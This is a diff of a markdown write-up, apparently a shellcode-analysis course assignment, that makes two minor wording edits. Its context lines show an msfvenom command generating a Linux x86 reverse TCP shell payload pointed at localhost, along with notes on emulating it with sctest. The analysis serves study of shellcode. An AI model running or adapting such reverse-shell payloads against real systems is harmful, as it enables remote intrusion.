@@ -201,7 +201,7 @@ The disassembled code consists of the following components:
 #### 2nd Shellcode (linux/x86/shell_reverse_tcp)
 --------------
 
-A Reverse TCP shell initiates a connection from the target host back to the attacker’s IP address and listening port, executing a shell on the target host’s machine (via the TCP protocol):
+A Reverse TCP shell initiates a connection from the target host back to the attacker’s IP address and listening port, executing a shell on the target host’s machine:
 
 ```bash
 osboxes@osboxes:~/Downloads/SLAE$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c
@@ -270,7 +270,7 @@ int execve (
 
 Sctest is used to emulate the specific instructions in the shellcode visually displaying the execution of the reverse shell payload. The parameters included in the Msfvenom payload are all visibly shown, the listening host, listening port and <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell.
 
-The required syscalls are also shown:
+The required syscalls are shown:
 
 * socket
 * dup2
